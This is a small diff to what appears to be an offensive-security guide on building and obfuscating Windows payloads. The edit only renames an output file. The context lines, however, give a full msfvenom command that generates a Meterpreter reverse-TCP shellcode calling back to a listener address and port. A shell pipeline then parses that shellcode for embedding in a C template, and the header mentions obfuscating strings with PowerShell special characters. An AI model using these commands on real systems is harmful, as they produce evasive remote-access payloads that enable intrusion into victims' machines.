@@ -105,12 +105,12 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 
 - Build shellcode in **C** format
 
-      msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -b '\x0a\x0d' -f c -o shellcode.txt
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -b '\x0a\x0d' -f c -o shell.txt
 
 - **Parsing** shellcode data
 
       # store parsed data into '$store' local var
-      store=`cat shellcode.txt | grep -v '=' | tr -d ';' | tr -d '\"' | tr -d '\\' | tr -d 'x' | tr -d '\n'`
+      store=`cat shell.txt | grep -v '=' | tr -d ';' | tr -d '\"' | tr -d '\\' | tr -d 'x' | tr -d '\n'`
 
 - **template.c**
 
